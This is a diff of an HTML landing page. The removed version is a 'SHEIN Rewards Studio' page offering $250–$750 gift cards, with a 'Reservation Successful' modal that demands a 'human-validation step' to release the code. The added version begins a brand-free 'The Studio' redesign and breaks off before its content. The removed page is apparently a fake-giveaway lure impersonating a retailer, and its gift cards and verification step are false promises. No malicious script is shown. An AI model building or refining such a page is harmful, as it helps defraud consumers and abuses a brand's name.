@@ -1,327 +1,385 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-  <meta http-equiv="Content-Style-Type" content="text/css">
-  <title></title>
-  <meta name="Generator" content="Cocoa HTML Writer">
-  <meta name="CocoaVersion" content="2575.4">
-  <style type="text/css">
-    p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Helvetica}
-    p.p2 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Helvetica; min-height: 14.0px}
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>The Studio | Lifestyle Access</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+          theme: {
+            extend: {
+              colors: {
+                champagne: '#F9F7F2',
+                sand: '#E6DDD0',
+                'gold-muted': '#C5A059',
+                'gold-light': '#E5D4B3',
+                charcoal: '#2C2C2C',
+                stone: '#8A8A8A',
+                'soft-white': '#FFFFFF',
+              },
+              fontFamily: {
+                sans: ['Montserrat', 'sans-serif'],
+                serif: ['Playfair Display', 'serif'],
+              }
+            }
+          }
+        }
+    </script>
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600&family=Playfair+Display:ital,wght@0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
+    <style>
+        body { 
+            font-family: 'Montserrat', sans-serif; 
+            background-color: var(--champagne); 
+            color: #2C2C2C;
+            -webkit-tap-highlight-color: transparent;
+            overflow-x: hidden;
+        }
+
+        h1, h2, h3, h4, .serif { font-family: 'Playfair Display', serif; }
+
+        /* Smooth Transitions */
+        .view-section {
+            display: none;
+            animation: fadeIn 0.8s ease-out forwards;
+        }
+        
+        .view-section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn { 
+            from { opacity: 0; transform: translateY(10px); } 
+            to { opacity: 1; transform: translateY(0); } 
+        }
+
+        /* Glassmorphism */
+        .glass-panel {
+            background: rgba(255, 255, 255, 0.7);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.5);
+        }
+
+        /* Custom Scrollbar for Horizontal Lists */
+        .hide-scroll::-webkit-scrollbar {
+            display: none;
+        }
+        .hide-scroll {
+            -ms-overflow-style: none;
+            scrollbar-width: none;
+        }
+
+        /* Editorial Image Masking */
+        .editorial-img {
+            transition: transform 0.6s cubic-bezier(0.22, 1, 0.36, 1);
+        }
+        .editorial-card:hover .editorial-img {
+            transform: scale(1.03);
+        }
+
+        /* Soft Button Styles */
+        .btn-editorial {
+            position: relative;
+            overflow: hidden;
+            transition: all 0.4s ease;
+        }
+        .btn-editorial::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 0%;
+            height: 1px;
+            background-color: currentColor;
+            transition: width 0.4s ease;
+        }
+        .btn-editorial:hover::after {
+            width: 100%;
+        }
+
+    </style>
 </head>
-<body>
-<p class="p1">&lt;!DOCTYPE html&gt;</p>
-<p class="p1">&lt;html lang="en"&gt;</p>
-<p class="p1">&lt;head&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;meta charset="UTF-8"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;title&gt;SHEIN Rewards Studio | Member Access&lt;/title&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;!-- Tailwind CSS --&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;script src="https://cdn.tailwindcss.com"&gt;&lt;/script&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;!-- Google Fonts --&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&amp;family=Playfair+Display:ital,wght@0,400;0,600;1,400;1,700&amp;display=swap" rel="stylesheet"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;style&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>:root {</p>
-<p class="p1"><span class="Apple-converted-space">            </span>--champagne: #f7ede2;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>--gold-accent: #c5a059;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>--onyx: #1a1a1a;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>--soft-white: #ffffff;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>}</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">        </span>body {<span class="Apple-converted-space"> </span></p>
-<p class="p1"><span class="Apple-converted-space">            </span>font-family: 'Montserrat', sans-serif;<span class="Apple-converted-space"> </span></p>
-<p class="p1"><span class="Apple-converted-space">            </span>background-color: var(--soft-white);<span class="Apple-converted-space"> </span></p>
-<p class="p1"><span class="Apple-converted-space">            </span>scroll-behavior: smooth;<span class="Apple-converted-space"> </span></p>
-<p class="p1"><span class="Apple-converted-space">            </span>color: var(--onyx);</p>
-<p class="p1"><span class="Apple-converted-space">        </span>}</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">        </span>h1, h2, h3, h4 { font-family: 'Playfair Display', serif; }</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">        </span>/* Floating Luxury Header */</p>
-<p class="p1"><span class="Apple-converted-space">        </span>.nav-glass {</p>
-<p class="p1"><span class="Apple-converted-space">            </span>background: rgba(255, 255, 255, 0.8);</p>
-<p class="p1"><span class="Apple-converted-space">            </span>backdrop-filter: blur(15px);</p>
-<p class="p1"><span class="Apple-converted-space">            </span>border-bottom: 1px solid rgba(0, 0, 0, 0.05);</p>
-<p class="p1"><span class="Apple-converted-space">            </span>transition: all 0.3s ease;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>}</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">        </span>.nav-link {</p>
-<p class="p1"><span class="Apple-converted-space">            </span>position: relative;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>transition: color 0.3s ease;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>}</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">        </span>.nav-link::after {</p>
-<p class="p1"><span class="Apple-converted-space">            </span>content: '';</p>
-<p class="p1"><span class="Apple-converted-space">            </span>position: absolute;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>bottom: -4px;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>left: 0;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>width: 0;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>height: 1px;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>background: var(--gold-accent);</p>
-<p class="p1"><span class="Apple-converted-space">            </span>transition: width 0.3s ease;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>}</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">        </span>.nav-link:hover::after {</p>
-<p class="p1"><span class="Apple-converted-space">            </span>width: 100%;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>}</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">        </span>/* Hero Layout Fix */</p>
-<p class="p1"><span class="Apple-converted-space">        </span>.hero-split {</p>
-<p class="p1"><span class="Apple-converted-space">            </span>display: grid;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>grid-template-columns: 1.2fr 0.8fr;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>min-height: 90vh;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>align-items: center;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>}</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">        </span>@media (max-width: 1024px) {</p>
-<p class="p1"><span class="Apple-converted-space">            </span>.hero-split {</p>
-<p class="p1"><span class="Apple-converted-space">                </span>grid-template-columns: 1fr;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>text-align: center;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>padding-top: 120px;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>}</p>
-<p class="p1"><span class="Apple-converted-space">        </span>}</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">        </span>.hero-image-box {</p>
-<p class="p1"><span class="Apple-converted-space">            </span>position: relative;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>height: 80vh;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>width: 100%;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>border-radius: 200px 0 0 200px;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>overflow: hidden;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>box-shadow: -20px 20px 60px rgba(0,0,0,0.05);</p>
-<p class="p1"><span class="Apple-converted-space">        </span>}</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">        </span>@media (max-width: 1024px) {</p>
-<p class="p1"><span class="Apple-converted-space">            </span>.hero-image-box {</p>
-<p class="p1"><span class="Apple-converted-space">                </span>height: 400px;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>border-radius: 40px;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>margin-top: 40px;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>}</p>
-<p class="p1"><span class="Apple-converted-space">        </span>}</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">        </span>.btn-luxury {</p>
-<p class="p1"><span class="Apple-converted-space">            </span>background: var(--onyx);</p>
-<p class="p1"><span class="Apple-converted-space">            </span>color: white;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);</p>
-<p class="p1"><span class="Apple-converted-space">            </span>cursor: pointer;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>letter-spacing: 0.15em;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>}</p>
-<p class="p2"><span class="Apple-converted-space">        </span></p>
-<p class="p1"><span class="Apple-converted-space">        </span>.btn-luxury:hover {<span class="Apple-converted-space"> </span></p>
-<p class="p1"><span class="Apple-converted-space">            </span>background: var(--gold-accent);</p>
-<p class="p1"><span class="Apple-converted-space">            </span>transform: translateY(-3px);<span class="Apple-converted-space"> </span></p>
-<p class="p1"><span class="Apple-converted-space">            </span>box-shadow: 0 15px 30px rgba(197, 160, 89, 0.2);<span class="Apple-converted-space"> </span></p>
-<p class="p1"><span class="Apple-converted-space">        </span>}</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">        </span>.fade-in { animation: fadeIn 1.2s ease-out forwards; }</p>
-<p class="p1"><span class="Apple-converted-space">        </span>@keyframes fadeIn { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">        </span>.modal-overlay { background: rgba(26, 26, 26, 0.8); backdrop-filter: blur(10px); }</p>
-<p class="p1"><span class="Apple-converted-space">        </span>.section-accent { background-color: var(--champagne); }</p>
-<p class="p1"><span class="Apple-converted-space">        </span>.reward-card {</p>
-<p class="p1"><span class="Apple-converted-space">            </span>background: white;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>border: 1px solid rgba(0,0,0,0.03);</p>
-<p class="p1"><span class="Apple-converted-space">            </span>transition: all 0.3s ease;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>}</p>
-<p class="p1"><span class="Apple-converted-space">        </span>.reward-card:hover {</p>
-<p class="p1"><span class="Apple-converted-space">            </span>border-color: var(--gold-accent);</p>
-<p class="p1"><span class="Apple-converted-space">            </span>transform: translateY(-10px);</p>
-<p class="p1"><span class="Apple-converted-space">        </span>}</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;/style&gt;</p>
-<p class="p1">&lt;/head&gt;</p>
-<p class="p1">&lt;body class="antialiased overflow-x-hidden"&gt;</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;!-- NAVIGATION: Redesigned for Luxury --&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;nav class="nav-glass fixed top-0 w-full z-[100] py-5 px-8 md:px-16 flex justify-between items-center"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;div class="flex flex-col"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;span class="text-2xl font-bold tracking-[0.5em] text-black leading-none uppercase"&gt;SHEIN&lt;/span&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;span class="text-[9px] tracking-[0.6em] text-gold-accent font-bold mt-1 uppercase"&gt;Rewards Studio&lt;/span&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;/div&gt;</p>
-<p class="p2"><span class="Apple-converted-space">        </span></p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;div class="hidden md:flex items-center space-x-12"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;div class="flex space-x-10 text-[10px] uppercase tracking-[0.2em] font-bold"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;a href="javascript:void(0)" onclick="scrollToSection('rewards')" class="nav-link"&gt;Collections&lt;/a&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;a href="javascript:void(0)" onclick="scrollToSection('how-it-works')" class="nav-link"&gt;The Process&lt;/a&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;a href="javascript:void(0)" onclick="scrollToSection('verify')" class="nav-link"&gt;Support&lt;/a&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;button onclick="scrollToSection('rewards')" class="border border-black px-6 py-2 rounded-full text-[9px] font-bold uppercase tracking-widest hover:bg-black hover:text-white transition"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>Access Rewards</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;/button&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;/div&gt;</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;!-- Mobile Menu Placeholder --&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;div class="md:hidden"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"&gt;&lt;path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7"&gt;&lt;/path&gt;&lt;/svg&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;/nav&gt;</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;!-- HERO SECTION: Redesigned Split Layout --&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;section class="relative bg-white"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;div class="container mx-auto px-6 lg:px-16 hero-split"&gt;</p>
-<p class="p2"><span class="Apple-converted-space">            </span></p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;!-- Left Side: Clean Typography --&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;div class="fade-in pr-0 lg:pr-20"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;div class="inline-flex items-center space-x-4 mb-6"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>&lt;span class="h-[1px] w-8 bg-gold-accent"&gt;&lt;/span&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>&lt;span class="text-[10px] uppercase tracking-[0.4em] text-gold-accent font-bold"&gt;Exclusively for Members&lt;/span&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;h1 class="text-6xl md:text-8xl lg:text-9xl mb-8 leading-[0.9]"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>Luxury &lt;br&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>&lt;span class="italic font-light text-gray-300"&gt;Gift Cards&lt;/span&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;/h1&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;p class="text-gray-500 text-lg md:text-xl max-w-xl leading-relaxed font-light mb-12"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>Experience the next level of fashion rewards. Our Studio provides verified users with premium SHEIN Gift Cards ranging from &lt;span class="text-black font-medium"&gt;$250 to $750&lt;/span&gt;.</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;/p&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;div class="flex flex-col sm:flex-row gap-6"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>&lt;button onclick="scrollToSection('rewards')" class="btn-luxury px-12 py-6 rounded-full text-[11px] font-bold uppercase shadow-2xl"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                        </span>Claim Your Credit</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>&lt;/button&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>&lt;button onclick="scrollToSection('how-it-works')" class="group flex items-center space-x-4 text-[11px] font-bold uppercase tracking-widest"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                        </span>&lt;span&gt;How it works&lt;/span&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                        </span>&lt;span class="w-8 h-8 rounded-full border border-gray-200 flex items-center justify-center group-hover:bg-black group-hover:text-white transition"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                            </span>&lt;svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"&gt;&lt;path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"&gt;&lt;/path&gt;&lt;/svg&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                        </span>&lt;/span&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>&lt;/button&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;/div&gt;</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;!-- Right Side: Editorial Visual --&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;div class="fade-in" style="animation-delay: 0.3s;"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;div class="hero-image-box"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>&lt;img src="https://images.unsplash.com/photo-1490481651871-ab68de25d43d?q=80&amp;w=1200&amp;auto=format&amp;fit=crop"<span class="Apple-converted-space"> </span></p>
-<p class="p1"><span class="Apple-converted-space">                         </span>alt="High-end Fashion"<span class="Apple-converted-space"> </span></p>
-<p class="p1"><span class="Apple-converted-space">                         </span>class="w-full h-full object-cover"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;/section&gt;</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;!-- PHASE 2: REWARD SELECTION --&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;section id="rewards" class="py-32 section-accent"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;div class="container mx-auto px-6"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;div class="text-center mb-20"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;h2 class="text-5xl md:text-6xl mb-6 font-bold"&gt;The Reward Suite&lt;/h2&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;p class="text-gray-500 max-w-xl mx-auto font-light leading-relaxed"&gt;Choose your preferred SHEIN gift card amount to begin the verification process.&lt;/p&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;/div&gt;</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;div class="grid lg:grid-cols-3 gap-12"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;!-- Reward 1 --&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;div class="reward-card rounded-[40px] p-12 flex flex-col items-center text-center shadow-xl shadow-gray-200/50"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>&lt;div class="text-[10px] uppercase tracking-[0.4em] text-gray-400 mb-10 font-bold"&gt;Boutique Access&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>&lt;div class="text-6xl font-bold mb-4"&gt;$250&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>&lt;p class="text-gray-400 text-sm mb-12 font-light italic"&gt;SHEIN GIFT CARD&lt;/p&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>&lt;button onclick="openConfirmation('$250 Gift Card')" class="w-full py-5 rounded-full border-2 border-gray-100 text-[10px] uppercase tracking-widest font-bold hover:bg-black hover:text-white transition-all"&gt;Select Tier&lt;/button&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;/div&gt;</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;!-- Reward 2: Featured --&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;div class="reward-card rounded-[40px] p-12 flex flex-col items-center text-center ring-4 ring-gold-accent relative shadow-2xl"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>&lt;div class="absolute -top-5 left-1/2 -translate-x-1/2 bg-gold-accent text-white px-8 py-2 rounded-full text-[10px] uppercase tracking-[0.3em] font-bold shadow-lg"&gt;Featured Selection&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>&lt;div class="text-[10px] uppercase tracking-[0.4em] text-gold-accent font-bold mb-10 mt-4"&gt;Premium Studio&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>&lt;div class="text-7xl font-bold mb-4"&gt;$500&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>&lt;p class="text-gray-400 text-sm mb-12 font-light italic"&gt;SHEIN GIFT CARD&lt;/p&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>&lt;button onclick="openConfirmation('$500 Gift Card')" class="w-full btn-luxury py-6 rounded-full text-[10px] uppercase tracking-widest font-bold shadow-xl"&gt;Select Premium&lt;/button&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;/div&gt;</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;!-- Reward 3 --&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;div class="reward-card rounded-[40px] p-12 flex flex-col items-center text-center shadow-xl shadow-gray-200/50"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>&lt;div class="text-[10px] uppercase tracking-[0.4em] text-gray-400 mb-10 font-bold"&gt;Elite Wardrobe&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>&lt;div class="text-6xl font-bold mb-4"&gt;$750&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>&lt;p class="text-gray-400 text-sm mb-12 font-light italic"&gt;SHEIN GIFT CARD&lt;/p&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>&lt;button onclick="openConfirmation('$750 Gift Card')" class="w-full py-5 rounded-full border-2 border-gray-100 text-[10px] uppercase tracking-widest font-bold hover:bg-black hover:text-white transition-all"&gt;Select Tier&lt;/button&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;/section&gt;</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;!-- FOOTER --&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;footer class="bg-white border-t border-gray-100 py-24 px-6 text-center" id="verify"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;div class="text-2xl font-bold tracking-[0.5em] text-black mb-8 uppercase"&gt;SHEIN STUDIO&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;p class="text-[10px] text-gray-400 uppercase tracking-[0.3em] max-w-lg mx-auto leading-loose mb-10"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>Rewards are subject to member verification and inventory availability. Not officially affiliated with SHEIN Inc.</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;/p&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;div class="flex justify-center space-x-8 text-[9px] uppercase tracking-widest text-gray-400 font-bold"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;a href="#" class="hover:text-gold-accent transition"&gt;Privacy Policy&lt;/a&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;a href="#" class="hover:text-gold-accent transition"&gt;Terms of Service&lt;/a&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;a href="#" class="hover:text-gold-accent transition"&gt;Support&lt;/a&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;/footer&gt;</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;!-- MODALS &amp; SCRIPT REMAIN THE SAME --&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;div id="confirmationModal" class="fixed inset-0 z-[200] hidden flex items-center justify-center px-4"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;div class="modal-overlay absolute inset-0" onclick="closeConfirmation()"&gt;&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;div class="bg-white max-w-md w-full rounded-[60px] p-12 relative z-10 shadow-2xl text-center fade-in"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;div class="mb-10"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;span class="inline-block px-5 py-2 rounded-full border border-gold-accent text-gold-accent text-[9px] uppercase tracking-widest font-bold mb-6"&gt;Reservation Successful&lt;/span&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;h3 class="text-4xl"&gt;Release &lt;span id="selectedTier" class="italic"&gt;&lt;/span&gt;?&lt;/h3&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;p class="text-gray-500 mb-10 text-sm font-light leading-relaxed"&gt;Your reward has been temporarily reserved. To release the digital code, please complete the secure human-validation step.&lt;/p&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;button onclick="goToVerification()" class="w-full btn-luxury py-6 rounded-full text-[11px] font-bold uppercase shadow-2xl"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>Start Secure Verification</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;/button&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;/div&gt;</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;!-- VERIFICATION PAGE --&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;div id="verificationScreen" class="fixed inset-0 z-[210] hidden bg-white flex flex-col items-center justify-center px-6 text-center"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;div class="max-w-md w-full space-y-12 fade-in"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;div class="space-y-6"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;div class="mx-auto w-16 h-16 text-gold-accent mb-8"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>&lt;svg fill="none" stroke="currentColor" viewBox="0 0 24 24"&gt;&lt;path stroke-linecap="round" stroke-linejoin="round" stroke-width="1" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"&gt;&lt;/path&gt;&lt;/svg&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;h2 class="text-5xl md:text-6xl leading-[0.9]"&gt;Member &lt;br&gt;Validation&lt;/h2&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;p class="text-gray-500 text-sm font-light italic"&gt;Confirm your status to release your gift card.&lt;/p&gt;</p>
